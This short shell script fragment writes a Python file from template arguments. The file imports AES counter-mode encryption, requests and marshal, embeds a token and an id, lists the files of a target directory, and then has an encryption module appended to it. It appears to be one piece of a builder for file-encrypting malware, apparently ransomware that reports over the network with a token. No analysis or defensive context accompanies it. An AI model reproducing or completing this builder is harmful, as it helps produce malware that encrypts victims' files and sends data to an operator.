echo "import os
import os.path
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter
import requests
import time
import marshal
time.clock = time.time
token = '$1'
id = '$2'
name = '$5'
files = dir_f_list('$4')" > $3
cat modules/encryption >> $3
